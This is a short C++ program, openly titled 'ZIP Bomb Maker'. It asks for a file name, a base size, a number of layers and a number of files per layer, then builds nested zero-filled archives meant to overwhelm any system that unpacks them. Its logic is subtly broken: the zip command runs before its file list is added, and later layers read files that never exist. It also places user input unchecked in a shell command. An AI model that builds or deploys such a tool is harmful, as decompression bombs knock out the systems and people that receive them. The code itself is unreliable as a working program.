#include <iostream>
#include <fstream>
#include <string>
using namespace std;
int duplicate(int layer, int file) {
    string sourceFilename = "l" + to_string(layer) + "f0";
    string destinationFilename = "l" + to_string(layer) + "f" + to_string(file);
    ifstream src(sourceFilename, ios::binary);
    ofstream dest(destinationFilename, ios::binary);
    dest << src.rdbuf();
    src.close();
    dest.close();
    return 0;
}
int zip(int layer, int files, bool final, string name) {
    string archiveName = "";
    if (final) {
        archiveName = name;
    } else if (!final){
        archiveName = "l" + to_string(layer) + "f0";
    }
    string command = "zip -j " + archiveName;
    int result = system(command.c_str());
    for (int i = 0; i < files; ++i) {
        command += " l" + to_string(layer) + "f" + to_string(i);
    }
    for (int i = 0; i < files; ++i) {
        string filename = "l" + to_string(layer) + "f" + to_string(i);
        remove(filename.c_str());
    }
    return result;
}
int startSequence(string name, int size, int layers, int files) {
    ofstream file("l0f0", ios::binary);
    if (!file) {
        cerr << "Failed to create file.\n";
        return 1;
    }
    const size_t bufferSize = 1024;
    char buffer[bufferSize] = {0};
    size_t fullChunks = size / bufferSize;
    size_t remainder = size % bufferSize;
    for (size_t i = 0; i < fullChunks; ++i) {
        file.write(buffer, bufferSize);
    }
    if (remainder > 0) {
        file.write(buffer, remainder);
    }
    file.close();
    for (int i = 0; i < layers; i++) {
        for (int j = 0; j < files; j++) {
            duplicate(i, j);
        }
        if (i != layers-1) {
            zip(i, files, false, name);
        } else if (i == layers-1) {
            zip(i, files, true, name);
        }
    }
    return 0;
}
int main() {
    cout << "Welcome to the ZIP Bomb Maker 👍👍👍👍👍👍👍👍👍👍👍👍👍" << endl << "Please enter the ZIP Filename" << endl;
    string name = ""; cin >> name; cout << "Base File size now plz (MB)" << endl; int size = 0; cin >> size; size *= 1024 * 1024;
    cout << "Number of layers now plz" << endl; int layers = 0; cin >> layers;
    cout << "Number of files per layer now plz" << endl; int files = 0; cin >> files;
    startSequence(name, size, layers, files);
    return 0;
}